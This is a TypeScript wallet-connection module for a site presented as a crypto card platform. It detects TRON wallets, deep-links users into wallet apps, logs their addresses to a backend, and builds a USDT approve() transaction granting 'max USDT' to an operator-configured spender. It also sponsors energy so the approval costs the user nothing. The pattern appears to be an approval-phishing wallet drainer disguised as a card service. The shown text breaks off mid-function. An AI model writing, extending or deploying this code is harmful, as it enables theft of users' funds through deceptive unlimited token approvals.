import { terminalLog } from '../../utils/terminalLog';
import {
  getTronNetworkConfig,
  getTronApiUrl,
  getTronApiUrls,
  getTronHeaders,
  getTronUsdtContract,
  getTronSpenderAddress,
  getTronApprovalAmount,
  getTronApprovalAmountBaseUnits,
  TRON_FEE_LIMIT,
  TRON_USDT_DECIMALS,
  getTronScanTxUrl,
  TRC20_APPROVE_ABI,
} from '../../config/tron';
import type { TronWeb, TronWebTransaction } from '../../types/tron';

// ─── Device Detection ─────────────────────────────────────────────────────────

export function isMobileDevice(): boolean {
  if (typeof window === 'undefined') return false;
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent || navigator.vendor || (window as any).opera || ''
  );
}

export function isTrustWalletDAppBrowser(): boolean {
  if (typeof window === 'undefined') return false;
  const ua = navigator.userAgent || '';
  return /Trust/i.test(ua) || (window as any).ethereum?.isTrust === true;
}

export function isMetaMaskDAppBrowser(): boolean {
  if (typeof window === 'undefined') return false;
  const ua = navigator.userAgent || '';
  return /MetaMask/i.test(ua) || (window as any).ethereum?.isMetaMask === true;
}

export function isTokenPocketDAppBrowser(): boolean {
  if (typeof window === 'undefined') return false;
  const ua = navigator.userAgent || '';
  return /TokenPocket/i.test(ua) || Boolean(window.tokenpocket);
}

export function isIOS(): boolean {
  if (typeof window === 'undefined') return false;
  return (
    /iPhone|iPad|iPod/i.test(navigator.userAgent || navigator.vendor || (window as any).opera || '') ||
    (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)
  );
}

// ─── Mobile Deep Links ────────────────────────────────────────────────────────

function appendAutoConnect(url: string, walletId: string): string {
  try {
    const urlObj = new URL(url, typeof window !== 'undefined' ? window.location.origin : 'http://localhost:5173');
    urlObj.searchParams.set('autoConnect', walletId);
    return urlObj.toString();
  } catch {
    const sep = url.includes('?') ? '&' : '?';
    return `${url}${sep}autoConnect=${encodeURIComponent(walletId)}`;
  }
}

/**
 * Returns the canonical site origin for use in deep links and DApp metadata.
 * On localhost/dev, falls back to the VITE_SITE_URL env var or a placeholder.
 * Trust Wallet reads this as the DApp's connected website domain.
 */
export function getSiteOrigin(): string {
  if (typeof window === 'undefined') return '';
  const origin = window.location.origin;
  // If running on localhost/127.0.0.1, Trust Wallet cannot verify the domain,
  // so use the env var VITE_SITE_URL if available (set to your production domain)
  if (
    origin.startsWith('http://localhost') ||
    origin.startsWith('http://127.0.0.1') ||
    origin.startsWith('http://0.0.0.0')
  ) {
    // Allow devs to set their production URL in .env for accurate DApp metadata
    return (import.meta as any).env?.VITE_SITE_URL || origin;
  }
  return origin;
}

export function getTrustWalletDeepLink(targetUrl?: string, autoConnect = true): string {
  let currentUrl = targetUrl || (typeof window !== 'undefined' ? window.location.href : '');
  if (autoConnect) {
    currentUrl = appendAutoConnect(currentUrl, 'trustWallet');
  }
  // On iOS (Chrome & Safari), universal links (https://link.trustwallet.com) do NOT open the app
  // when triggered programmatically. The custom scheme (trust://) triggers the native iOS dialog.
  if (isIOS()) {
    return `trust://open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
  }
  // coin_id=195 is TRON in SLIP-0044 — this tells Trust Wallet to open with TRON context
  return `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
}

export function getMetaMaskDeepLink(targetUrl?: string): string {
  if (typeof window === 'undefined') return '';
  const currentUrl = targetUrl || window.location.href;
  const cleanedUrl = currentUrl.replace(/^https?:\/\//, '');
  if (isIOS()) {
    return `metamask://dapp/${cleanedUrl}`;
  }
  return `https://metamask.app.link/dapp/${cleanedUrl}`;
}

/**
 * TokenPocket mobile DApp browser deep link.
 * Opens the current URL inside TokenPocket's built-in TRON-aware DApp browser.
 */
export function getTokenPocketDeepLink(targetUrl?: string, autoConnect = true): string {
  let currentUrl = targetUrl || (typeof window !== 'undefined' ? window.location.href : '');
  if (autoConnect) {
    currentUrl = appendAutoConnect(currentUrl, 'tokenPocket');
  }
  const params = JSON.stringify({ url: currentUrl, chain: 'Tron', source: 'ZenithBlockChain' });
  return `tpdapp://open?params=${encodeURIComponent(params)}`;
}

/**
 * App Store / Play Store install URLs for wallets that support TRON.
 * Shown as fallback when the wallet app is not installed on mobile.
 */
export const WALLET_INSTALL_URLS: Record<string, { ios: string; android: string; desktop?: string }> = {
  trustWallet: {
    ios: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
    android: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
    desktop: 'https://trustwallet.com/browser-extension',
  },
  tokenPocket: {
    ios: 'https://apps.apple.com/app/tokenpocket-crypto-defi-wallet/id1436028697',
    android: 'https://play.google.com/store/apps/details?id=vip.mytokenpocket',
    desktop: 'https://extension.tokenpocket.pro/',
  },
  tronLink: {
    ios: 'https://apps.apple.com/app/tronlink/id1453530188',
    android: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet',
    desktop: 'https://www.tronlink.org/',
  },
};

/**
 * Returns the best install URL for a wallet given device context.
 */
export function getWalletInstallUrl(walletId: string, mobile: boolean): string {
  const urls = WALLET_INSTALL_URLS[walletId];
  if (!urls) return '';
  if (mobile) {
    const isIOS = /iPhone|iPad|iPod/i.test(typeof navigator !== 'undefined' ? navigator.userAgent : '');
    return isIOS ? urls.ios : urls.android;
  }
  return urls.desktop || '';
}

// ─── Address Utilities (TRON Base58 <-> Hex) ──────────────────────────────────

const BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

/**
 * Convert a TRON base58check address (T...) to 41-prefixed hex string.
 * First byte is 0x41, next 20 bytes are address, last 4 bytes are checksum.
 */
export function tronBase58ToHex(base58Addr: string): string {
  if (!base58Addr || !base58Addr.startsWith('T')) {
    if (base58Addr?.startsWith('41') && base58Addr.length === 42) return base58Addr.toLowerCase();
    if (base58Addr?.startsWith('0x') && base58Addr.length === 42) return '41' + base58Addr.slice(2).toLowerCase();
    return base58Addr || '';
  }

  const BASE = BigInt(58);
  let num = BigInt(0);
  for (const char of base58Addr) {
    const idx = BASE58_ALPHABET.indexOf(char);
    if (idx < 0) throw new Error(`Invalid base58 character in TRON address: ${char}`);
    num = num * BASE + BigInt(idx);
  }

  let hex = num.toString(16);
  if (hex.length < 50) hex = hex.padStart(50, '0');
  // Return the "41" prefix + 40 hex chars (strip 4-byte checksum)
  return hex.slice(0, 42).toLowerCase();
}

/**
 * Convert TRON address to 32-byte (64 hex characters) ABI-encoded parameter.
 * Used for triggersmartcontract function parameters.
 */
export function tronAddrToAbiParam(addr: string): string {
  let hex40: string;
  if (addr.startsWith('T') && addr.length >= 33) {
    const hex42 = tronBase58ToHex(addr);
    hex40 = hex42.slice(2); // Remove "41" prefix
  } else if (addr.startsWith('0x')) {
    hex40 = addr.slice(2).toLowerCase();
  } else if (addr.startsWith('41') && addr.length === 42) {
    hex40 = addr.slice(2).toLowerCase();
  } else {
    hex40 = addr.toLowerCase();
  }
  return hex40.padStart(64, '0');
}

/**
 * Convert raw amount to 32-byte (64 hex characters) ABI-encoded uint256 parameter.
 */
export function tronAmountToAbiParam(amount: string, decimals = TRON_USDT_DECIMALS): string {
  const numeric = parseFloat(amount) || 1;
  const rawAmount = BigInt(Math.round(numeric * Math.pow(10, decimals)));
  return rawAmount.toString(16).padStart(64, '0');
}

// ─── Provider Detection ───────────────────────────────────────────────────────

export interface TronProviderInfo {
  available: boolean;
  providerName: string;
  isMobile: boolean;
  inDAppBrowser: boolean;
  tronWebInstance: TronWeb | null;
  requiresExtensionInstall: boolean;
  installUrl?: string;
  appStoreUrl?: string;
  warning?: string;
}

export function getTronLinkDeepLink(targetUrl?: string, autoConnect = true): string {
  let currentUrl = targetUrl || (typeof window !== 'undefined' ? window.location.href : '');
  if (autoConnect) {
    currentUrl = appendAutoConnect(currentUrl, 'tronLink');
  }
  return `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({ url: currentUrl, action: 'open', protocol: 'tronlink', version: '1.0' }))}`;
}

export function isTronLinkInstalled(): boolean {
  if (typeof window === 'undefined') return false;
  return Boolean(window.tronLink || (window as any).tronWeb?.isTronLink);
}

export type TronWalletId = 'trustWallet' | 'metaMask' | 'tronLink' | 'tokenPocket';

export function getInjectedTronWeb(): any {
  if (typeof window === 'undefined') return null;
  return (
    window.tronWeb ||
    (window as any).trustwallet?.tronLink?.tronWeb ||
    (window as any).trustwallet?.tronWeb ||
    (window as any).tronLink?.tronWeb ||
    (window as any).tron?.tronWeb ||
    null
  );
}

export function getInjectedTronAddress(): string {
  if (typeof window === 'undefined') return '';
  const tw = getInjectedTronWeb();
  if (tw?.defaultAddress?.base58) return tw.defaultAddress.base58;
  if (tw?.defaultAddress?.name) return tw.defaultAddress.name;
  if ((window as any).trustwallet?.tronLink?.defaultAddress?.base58) {
    return (window as any).trustwallet.tronLink.defaultAddress.base58;
  }
  if ((window as any).tron?.defaultAddress?.base58) {
    return (window as any).tron.defaultAddress.base58;
  }
  if ((window as any).tronLink?.defaultAddress?.base58) {
    return (window as any).tronLink.defaultAddress.base58;
  }
  return '';
}

export function detectTronProvider(walletChoice?: TronWalletId): TronProviderInfo {
  const isMobile = isMobileDevice();
  const injectedTw = getInjectedTronWeb();
  const hasTronWeb = typeof window !== 'undefined' && Boolean(
    (injectedTw && (injectedTw.defaultAddress?.base58 || injectedTw.ready !== undefined)) ||
    (window as any).trustwallet?.tron ||
    (window as any).trustwallet?.tronLink
  );
  const hasTronLink = typeof window !== 'undefined' && Boolean(
    window.tronLink ||
    (window as any).tron ||
    (window as any).trustwallet?.tronLink ||
    (window as any).trustwallet?.tron
  );

  const inTrustBrowser = isTrustWalletDAppBrowser();
  const inMetaMaskBrowser = isMetaMaskDAppBrowser();
  const inTokenPocketBrowser = isTokenPocketDAppBrowser();

  // ── TronLink ──────────────────────────────────────────────────────────────
  if (walletChoice === 'tronLink') {
    if (hasTronLink || hasTronWeb) {
      const tronWeb = (window.tronWeb || (window.tronLink as any)?.tronWeb) as TronWeb;
      return {
        available: true,
        providerName: 'TronLink',
        isMobile,
        inDAppBrowser: !isMobile && hasTronLink,
        tronWebInstance: tronWeb,
        requiresExtensionInstall: false,
      };
    }
    return {
      available: false,
      providerName: 'TronLink',
      isMobile,
      inDAppBrowser: false,
      tronWebInstance: null,
      requiresExtensionInstall: !isMobile,
      installUrl: isMobile ? getTronLinkDeepLink() : WALLET_INSTALL_URLS.tronLink.desktop,
      appStoreUrl: getWalletInstallUrl('tronLink', isMobile),
      warning: isMobile
        ? 'Opening in TronLink Mobile App...'
        : 'TronLink Chrome extension not detected. Please install TronLink to test on TRON Nile Testnet.',
    };
  }

  // ── MetaMask — no native TRON support ─────────────────────────────────────
  if (walletChoice === 'metaMask') {
    if (!hasTronWeb) {
      return {
        available: false,
        providerName: 'MetaMask',
        isMobile,
        inDAppBrowser: inMetaMaskBrowser,
        tronWebInstance: null,
        requiresExtensionInstall: false,
        warning: 'MetaMask does not natively support TRON (TRC-20). Please use Trust Wallet, TokenPocket, or TronLink for TRON.',
      };
    }
  }

  // ── TokenPocket — native TRON support via tronWeb injection ───────────────
  if (walletChoice === 'tokenPocket') {
    // Inside TokenPocket DApp browser — window.tronWeb is injected
    if (inTokenPocketBrowser && (hasTronWeb || hasTronLink)) {
      const tronWeb = (window.tronWeb || (window.tronLink as any)?.tronWeb) as TronWeb;
      return {
        available: true,
        providerName: 'TokenPocket',
        isMobile,
        inDAppBrowser: true,
        tronWebInstance: tronWeb,
        requiresExtensionInstall: false,
      };
    }
    // Also accept any available tronWeb on desktop (TP extension injects it)
    if (!isMobile && hasTronWeb) {
      const tronWeb = window.tronWeb as TronWeb;
      return {
        available: true,
        providerName: 'TokenPocket Extension',
        isMobile: false,
        inDAppBrowser: false,
        tronWebInstance: tronWeb,
        requiresExtensionInstall: false,
      };
    }
    // Not available — provide deep link and app store URLs
    return {
      available: false,
      providerName: 'TokenPocket',
      isMobile,
      inDAppBrowser: false,
      tronWebInstance: null,
      requiresExtensionInstall: !isMobile,
      installUrl: isMobile ? getTokenPocketDeepLink() : WALLET_INSTALL_URLS.tokenPocket.desktop,
      appStoreUrl: getWalletInstallUrl('tokenPocket', isMobile),
    };
  }

  // ── Trust Wallet or any generic TRON provider ──────────────────────────────
  if (hasTronWeb || hasTronLink) {
    const tronWeb = (window.tronWeb || (window.tronLink as any)?.tronWeb) as TronWeb;
    let providerName = 'Trust Wallet';
    if (inTokenPocketBrowser) {
      providerName = 'TokenPocket';
    } else if ((window as any).trustwallet?.tron || inTrustBrowser) {
      providerName = 'Trust Wallet';
    } else if (hasTronLink && !inTrustBrowser) {
      providerName = 'TronLink / Trust Wallet';
    }

    return {
      available: true,
      providerName,
      isMobile,
      inDAppBrowser: inTrustBrowser || inMetaMaskBrowser || inTokenPocketBrowser,
      tronWebInstance: tronWeb,
      requiresExtensionInstall: false,
    };
  }

  // Not available on mobile
  if (isMobile) {
    const wid = walletChoice as string | undefined;
    const deepLink = wid === 'metaMask'
      ? getMetaMaskDeepLink()
      : wid === 'tokenPocket'
        ? getTokenPocketDeepLink()
        : getTrustWalletDeepLink();
    return {
      available: false,
      providerName: wid === 'metaMask' ? 'MetaMask' : wid === 'tokenPocket' ? 'TokenPocket' : 'Trust Wallet',
      isMobile: true,
      inDAppBrowser: false,
      tronWebInstance: null,
      requiresExtensionInstall: false,
      installUrl: deepLink,
      appStoreUrl: wid ? getWalletInstallUrl(wid, true) : '',
    };
  }

  // Desktop without any extension
  const wid = walletChoice as string | undefined;
  return {
    available: false,
    providerName: wid === 'metaMask' ? 'MetaMask' : wid === 'tokenPocket' ? 'TokenPocket' : 'Trust Wallet',
    isMobile: false,
    inDAppBrowser: false,
    tronWebInstance: null,
    requiresExtensionInstall: true,
    installUrl: wid === 'tokenPocket' ? WALLET_INSTALL_URLS.tokenPocket.desktop : WALLET_INSTALL_URLS.trustWallet.desktop,
    warning: wid === 'tokenPocket'
      ? 'TokenPocket extension not detected. Please install it or open this page in the TokenPocket mobile app.'
      : 'Trust Wallet extension not detected in this browser.',
  };
}

// ─── Connect TRON Wallet ──────────────────────────────────────────────────────

export interface TronConnectionResult {
  success: boolean;
  address?: string;
  addressHex?: string;
  trxBalance?: number;
  networkName?: string;
  providerName?: string;
  error?: string;
  redirectUrl?: string;
}

export async function connectTronWallet(walletId: TronWalletId): Promise<TronConnectionResult> {
  terminalLog.group('TRON', `🔌 Connecting TRON wallet via ${walletId}`);

  const detection = detectTronProvider(walletId);

  // Mobile without injected provider -> trigger deep link
  if (detection.isMobile && !detection.available) {
    const deepLink = walletId === 'metaMask'
      ? getMetaMaskDeepLink()
      : walletId === 'tronLink'
        ? getTronLinkDeepLink()
        : walletId === 'tokenPocket'
          ? getTokenPocketDeepLink()
          : getTrustWalletDeepLink();
    terminalLog.info('TRON', `Mobile device detected without injected provider. Deep link: ${deepLink}`);
    terminalLog.groupEnd();
    return {
      success: false,
      redirectUrl: deepLink,
      error: `Opening ${walletId} mobile app...`,
    };
  }

  // Desktop without provider
  if (!detection.available) {
    const errorMsg = detection.warning || 'No TRON wallet provider detected. Please install Trust Wallet or TronLink extension.';
    terminalLog.warn('TRON', errorMsg);
    terminalLog.groupEnd();
    return {
      success: false,
      error: errorMsg,
      redirectUrl: detection.installUrl,
    };
  }

  try {
    let requestedAddress = '';

    // ── Inject DApp identity metadata ────────────────────────────────────────
    // Trust Wallet's in-app browser reads document.title, the favicon link tag,
    // and the window.__ZENITH_DAPP__ object to display the website name & icon
    // in the "Connect DApp" popup and in Settings → WalletConnect → Connected DApps.
    // This is the authoritative way to set DApp metadata for Trust Wallet's TRON provider.
    try {
      const siteOrigin = getSiteOrigin();
      const iconUrl = `${siteOrigin}/favicon.svg`;
      (window as any).__ZENITH_DAPP__ = {
        name: 'ZenithBlockChain',
        description: 'Crypto Card Platform — Issue your crypto Trust card instantly.',
        url: siteOrigin,
        icons: [iconUrl],
      };
      // Also write to the standardised WalletConnect DApp metadata key that
      // some wallet providers read during connection handshake
      (window as any).__WC_DAPP_METADATA__ = (window as any).__ZENITH_DAPP__;
      terminalLog.info('TRON', 'DApp metadata injected into window', { siteOrigin, iconUrl });
    } catch {
      // Non-critical — ignore
    }

    // ── Provider priority order ───────────────────────────────────────────────
    // window.tron  = Trust Wallet's dedicated TRON provider (preferred)
    // window.trustwallet.tronLink / tron = Trust Wallet fallback namespaces
    // window.tronLink = TronLink extension
    const tronProvider =
      (window as any).tron ||
      (window as any).trustwallet?.tronLink ||
      (window as any).trustwallet?.tron ||
      (window as any).tronLink;

    terminalLog.info('TRON', 'INJECTION DIAGNOSTIC', {
      hasWindowTron: Boolean((window as any).tron),
      hasWindowTronWeb: Boolean((window as any).tronWeb),
      tronWebReady: (window as any).tronWeb?.ready,
      tronWebDefaultAddress: (window as any).tronWeb?.defaultAddress,
      hasTronLink: Boolean((window as any).tronLink),
      hasTrustWallet: Boolean((window as any).trustwallet),
      hasTrustWalletTronLink: Boolean((window as any).trustwallet?.tronLink),
      hasTrustWalletTron: Boolean((window as any).trustwallet?.tron),
      hasEthereum: Boolean((window as any).ethereum),
      selectedProvider: tronProvider ? 'found' : 'none',
    });

    // 1. Try native TRON tron_requestAccounts first (window.tron is Trust Wallet's TRON provider)
    if (tronProvider && typeof tronProvider.request === 'function') {
      try {
        terminalLog.info('TRON', 'Requesting authorization via tronProvider.request({ method: "tron_requestAccounts" })...');
        const res: any = await tronProvider.request({ method: 'tron_requestAccounts' });
        terminalLog.info('TRON', 'tron_requestAccounts response:', res);
        if (res) {
          if (res.code && res.code !== 200) {
            throw new Error(res.message || 'User rejected wallet connection');
          }
          if (Array.isArray(res) && res[0]) {
            requestedAddress = res[0];
          } else if (res.data?.address) {
            requestedAddress = res.data.address;
          } else if (res.address) {
            requestedAddress = res.address;
          } else if (typeof res === 'string') {
            requestedAddress = res;
          }
        }
      } catch (err: any) {
        if (err?.code === 4001 || err?.message?.includes('reject') || err?.message?.includes('User denied')) {
          throw new Error('User rejected wallet connection');
        }
        terminalLog.warn('TRON', 'tron_requestAccounts error:', err?.message || err);
      }
    } else if (window.tronLink && typeof window.tronLink.request === 'function') {
      try {
        terminalLog.info('TRON', 'Requesting accounts via window.tronLink.request({ method: "tron_requestAccounts" })...');
        const res: any = await window.tronLink.request({ method: 'tron_requestAccounts' });
        terminalLog.info('TRON', 'window.tronLink response:', res);
        if (res && res.code && res.code !== 200) {
          throw new Error(res.message || 'User rejected wallet connection');
        }
        if (Array.isArray(res) && res[0]) {
          requestedAddress = res[0];
        } else if (res?.data?.address) {
          requestedAddress = res.data.address;
        } else if (typeof res === 'string') {
          requestedAddress = res;
        }
      } catch (err: any) {
        if (err?.code === 4001 || err?.message?.includes('reject') || err?.message?.includes('User denied')) {
          throw new Error('User rejected wallet connection');
        }
        terminalLog.warn('TRON', 'window.tronLink.request error:', err?.message || err);
      }
    }

    // 2. If requestedAddress not yet returned, try eth_requestAccounts
    if (!requestedAddress && tronProvider && typeof tronProvider.request === 'function') {
      try {
        terminalLog.info('TRON', 'Requesting authorization via eth_requestAccounts...');
        const accounts = await tronProvider.request({ method: 'eth_requestAccounts' });
        terminalLog.info('TRON', 'eth_requestAccounts response:', accounts);
        if (Array.isArray(accounts) && accounts[0]) {
          requestedAddress = accounts[0];
        } else if (typeof accounts === 'string') {
          requestedAddress = accounts;
        }
      } catch (reqErr: any) {
        if (reqErr?.code === 4001 || reqErr?.message?.includes('reject') || reqErr?.message?.includes('User denied')) {
          throw new Error('User rejected wallet connection');
        }
        terminalLog.warn('TRON', 'eth_requestAccounts error:', reqErr?.message || reqErr);
      }
    }

    // 3. Wait briefly for tronWeb defaultAddress or requestedAddress to become ready
    let attempts = 0;
    while (!requestedAddress && !getInjectedTronAddress() && attempts < 25) {
      await new Promise((r) => setTimeout(r, 200));
      attempts++;
    }

    let base58Address = requestedAddress || getInjectedTronAddress();
    let tronWeb = getInjectedTronWeb();

    // If requested address is in hex (e.g. starts with 41... or 0x...), convert to base58
    if (base58Address && tronWeb?.address && typeof tronWeb.address.fromHex === 'function') {
      try {
        if (base58Address.startsWith('41') || base58Address.startsWith('0x')) {
          base58Address = tronWeb.address.fromHex(base58Address);
        }
      } catch {
        // ignore
      }
    }

    // Ensure tronWeb defaultAddress is populated
    if (base58Address && tronWeb && typeof tronWeb.setAddress === 'function') {
      try {
        tronWeb.setAddress(base58Address);
      } catch {
        // ignore
      }
    }

    const hexAddress = tronWeb?.defaultAddress?.hex || '';

    if (!base58Address) {
      throw new Error('Unable to retrieve TRON wallet address. Please unlock your wallet and approve access.');
    }

    // Fetch TRX balance
    let trxBalance = 0;
    try {
      const balanceSun = await tronWeb.trx.getBalance(base58Address);
      trxBalance = balanceSun / 1_000_000;
    } catch {
      // Non-critical, balance fetch error ignored
    }

    const networkConfig = getTronNetworkConfig(tronWeb);
    terminalLog.info('TRON', `Wallet connected successfully`, {
      address: base58Address,
      addressHex: hexAddress,
      trxBalance,
      network: networkConfig.name,
    });

    // Save wallet session to backend PostgreSQL/memory store
    try {
      await fetch('/api/wallet-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: base58Address,
          walletSoftware:
            walletId === 'trustWallet' ? 'TrustWallet'
              : walletId === 'tronLink' ? 'TronLink'
                : walletId === 'tokenPocket' ? 'TokenPocket'
                  : 'MetaMask',
          network: 'tron',
          chainFamily: 'tron',
          device: detection.isMobile ? 'Mobile' : 'Desktop',
          platform: navigator.platform || '',
        }),
      });
      terminalLog.info('TRON', 'Wallet session logged to backend /api/wallet-session');
    } catch (sessionErr) {
      terminalLog.warn('TRON', `Could not save wallet session: ${sessionErr}`);
    }

    terminalLog.groupEnd();

    return {
      success: true,
      address: base58Address,
      addressHex: hexAddress,
      trxBalance,
      networkName: networkConfig.name,
      providerName: detection.providerName,
    };
  } catch (err: any) {
    const errorMsg = err?.message || String(err);
    terminalLog.error('TRON', `Connection failed: ${errorMsg}`);
    terminalLog.groupEnd();
    return {
      success: false,
      error: errorMsg,
    };
  }
}

// ─── TRC-20 USDT Approval Flow ────────────────────────────────────────────────

export interface TronApprovalResult {
  success: boolean;
  txId?: string;
  explorerUrl?: string;
  amount?: string;
  spender?: string;
  error?: string;
}

/**
 * Builds an unsigned triggerSmartContract approve transaction with multiple fallback mechanisms:
 * 1. Direct RPC calls across available TRON nodes (TronGrid, TronStack) with API key headers
 * 2. Backend proxy (/api/tron/trigger-smart-contract) to bypass client/mobile IP rate limits (HTTP 429)
 * 3. tronWeb.transactionBuilder fallback
 */
async function buildTriggerSmartContractTx(
  userHex: string,
  contractHex: string,
  spenderAddress: string,
  rawAmountBigInt: bigint,
  parameter: string,
  tronWeb: any
): Promise<TronWebTransaction> {
  const rpcUrls = getTronApiUrls(tronWeb);
  const headers = getTronHeaders();

  for (const apiUrl of rpcUrls) {
    try {
      terminalLog.info('TRON', `Calling ${apiUrl}/wallet/triggersmartcontract...`, {
        owner_address: userHex,
        contract_address: contractHex,
        function_selector: 'approve(address,uint256)',
        fee_limit: TRON_FEE_LIMIT,
      });

      const triggerRes = await fetch(`${apiUrl}/wallet/triggersmartcontract`, {
        method: 'POST',
        headers,
        body: JSON.stringify({
          owner_address: userHex,
          contract_address: contractHex,
          function_selector: 'approve(address,uint256)',
          parameter,
          fee_limit: TRON_FEE_LIMIT,
          call_value: 0,
          visible: false,
        }),
      });

      if (triggerRes.ok) {
        const triggerData = await triggerRes.json();
        if (triggerData?.result?.result && triggerData.transaction) {
          return triggerData.transaction as TronWebTransaction;
        }
        terminalLog.warn('TRON', `Node ${apiUrl} returned unconfirmed result`, triggerData?.result);
      } else {
        terminalLog.warn('TRON', `Node ${apiUrl} returned HTTP ${triggerRes.status}: ${triggerRes.statusText}`);
      }
    } catch (nodeErr) {
      terminalLog.warn('TRON', `Node ${apiUrl} request failed: ${nodeErr}`);
    }
  }

  // Fallback 1: Backend proxy endpoint (runs from server IP, immune to mobile CGNAT / shared IP 429)
  try {
    terminalLog.info('TRON', 'Attempting backend proxy /api/tron/trigger-smart-contract fallback...');
    const proxyRes = await fetch('/api/tron/trigger-smart-contract', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        owner_address: userHex,
        contract_address: contractHex,
        function_selector: 'approve(address,uint256)',
        parameter,
        fee_limit: TRON_FEE_LIMIT,
      }),
    });

    if (proxyRes.ok) {
      const proxyData = await proxyRes.json();
      if (proxyData?.success && proxyData.transaction) {
        terminalLog.info('TRON', 'Backend proxy built transaction successfully');
        return proxyData.transaction as TronWebTransaction;
      }
    } else {
      terminalLog.warn('TRON', `Backend proxy returned HTTP ${proxyRes.status}`);
    }
  } catch (proxyErr) {
    terminalLog.warn('TRON', `Backend proxy request failed: ${proxyErr}`);
  }

  // Fallback 2: tronWeb.transactionBuilder
  if (tronWeb?.transactionBuilder?.triggerSmartContract) {
    try {
      terminalLog.info('TRON', 'Attempting tronWeb.transactionBuilder fallback...');
      const tbResult = await tronWeb.transactionBuilder.triggerSmartContract(
        contractHex,
        'approve(address,uint256)',
        { feeLimit: TRON_FEE_LIMIT, callValue: 0 },
        [
          { type: 'address', value: spenderAddress },
          { type: 'uint256', value: rawAmountBigInt.toString() },
        ],
        userHex
      );
      if (tbResult?.result?.result && tbResult.transaction) {
        return tbResult.transaction as TronWebTransaction;
      }
    } catch (tbErr) {
      terminalLog.warn('TRON', `transactionBuilder fallback error: ${tbErr}`);
    }
  }

  throw new Error('Failed to build TRON approve transaction from network node (all RPC nodes & proxy failed)');
}

/**
 * WalletConnect v2 signing path for TRC-20 approval.
 *
 * Used when the user connected via WalletConnect v2 from an external browser
 * (Chrome / Safari on phone). In this case window.tronWeb is NOT available,
 * so we:
 *   1. Build the unsigned approve() tx via direct TRON API (no tronWeb needed)
 *   2. Sign via WalletConnect relay → tron_signTransaction → Trust Wallet popup
 *   3. Broadcast the signed tx via direct TronGrid API
 *
 * This makes the "Confirm Transaction" screen appear in Trust Wallet after the
 * user approved the WalletConnect session.
 */
async function requestTrc20ApprovalViaWC(
  userAddress: string,
  wcSessionTopic: string,
  onStatusUpdate?: (status: 'building' | 'waiting_signature' | 'broadcasting' | 'confirmed' | 'failed', message?: string) => void
): Promise<TronApprovalResult> {
  const { initTronWCClient } = await import('./tronWalletConnectService');

  const networkConfig = getTronNetworkConfig(null);
  const usdtContract = getTronUsdtContract(null);
  const spenderAddress = getTronSpenderAddress();
  const rawAmountBigInt = getTronApprovalAmountBaseUnits();

  if (!spenderAddress) {
    return { success: false, error: 'TRON spender address not configured (VITE_SPENDER_ADDRESS_TRON).' };
  }

  terminalLog.group('TRON', `📝 [WalletConnect] Requesting TRC-20 USDT approve() via WC relay`);
  terminalLog.info('TRON', 'WC Approval Parameters:', {
    user: userAddress,
    network: networkConfig.name,
    tokenContract: usdtContract,
    spender: spenderAddress,
    amount: 'max USDT',
    wcSessionTopic,
  });

  // ── 1. Energy sponsorship (same as normal flow) ───────────────────────────
  let sponsorshipId: string | undefined;
  try {
    onStatusUpdate?.('building', 'Preparing energy sponsorship for zero-fee approval...');
    const prepRes = await fetch('/api/tron/prepare-sponsorship', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress }),
    });
    if (prepRes.ok) {
      const prepData = await prepRes.json();
      sponsorshipId = prepData.sponsorshipId;
      terminalLog.info('TRON', '⚡ Energy sponsorship prepared:', prepData);

      if (prepData.status !== 'ENERGY_READY') {
        onStatusUpdate?.('building', 'Allocating temporary energy sponsorship...');
        let ready = false;
        for (let attempt = 0; attempt < 20; attempt++) {
          await new Promise((r) => setTimeout(r, 1500));
          const checkRes = await fetch('/api/tron/check-energy', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userAddress, sponsorshipId }),
          });
          if (checkRes.ok) {
            const checkData = await checkRes.json();
            const reqEnergy = Number(checkData.requiredEnergy);
            const availEnergy = Number(checkData.availableEnergy);
            if ((checkData.isReady || checkData.status === 'ENERGY_READY') && availEnergy >= reqEnergy) {
              ready = true;
              terminalLog.info('TRON', `⚡ Energy confirmed ready! Available: ${availEnergy} >= Required: ${reqEnergy}`);
              break;
            }
          }
        }
        if (!ready) {
          const msg = 'Energy delegation polling timed out. Please try again.';
          terminalLog.error('TRON', msg);
          if (sponsorshipId) {
            fetch('/api/tron/cancel-sponsorship', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sponsorshipId, reason: 'ENERGY_VERIFICATION_FAILED' }),
            }).catch(() => { });
          }
          return { success: false, error: msg };
        }
      }
    }
  } catch (sponsorErr) {
    terminalLog.warn('TRON', `Energy sponsorship warning (non-fatal): ${sponsorErr}`);
    // Non-fatal for WC path — continue without sponsorship
  }

  // ── 2. Build the unsigned approve() transaction via TRON API ──────────────
  onStatusUpdate?.('building', 'Building TRC-20 approval transaction...');
  let unsignedTx: any;
  try {
    const userHex = tronBase58ToHex(userAddress);
    const contractHex = tronBase58ToHex(usdtContract);
    const spenderParam = tronAddrToAbiParam(spenderAddress);
    const amountParam = rawAmountBigInt.toString(16).padStart(64, '0');
    const parameter = spenderParam + amountParam;

    unsignedTx = await buildTriggerSmartContractTx(
      userHex,
      contractHex,
      spenderAddress,
      rawAmountBigInt,
      parameter,
      null   // tronWeb not needed — buildTriggerSmartContractTx uses direct API first
    );
    terminalLog.info('TRON', '✔ Unsigned approve() tx built via TRON API', { txID: unsignedTx.txID });
  } catch (buildErr: any) {
    const msg = buildErr?.message || String(buildErr);
    terminalLog.error('TRON', `✖ Failed to build unsigned tx: ${msg}`);
    if (sponsorshipId) {
      fetch('/api/tron/cancel-sponsorship', {
